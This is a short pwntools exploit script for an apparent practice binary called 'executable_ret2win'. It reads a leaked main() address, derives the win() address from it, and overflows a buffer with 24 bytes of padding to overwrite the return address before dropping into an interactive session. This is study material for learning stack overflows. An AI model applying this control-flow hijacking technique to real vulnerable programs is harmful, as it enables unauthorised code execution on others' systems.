#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'executable_ret2win')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

main_location = int(io.recvline().split(b'0x')[1], 16)

win_location = main_location - 26 # the location of the win() instruction is exactly 26 bytes behind main(), regardless of position-independant execution

buffer = b'A' * 24 # 24 bytes of padding
buffer += p64(win_location) # address of the win() method to where we overwrite the return address

io.send(buffer)

io.interactive()

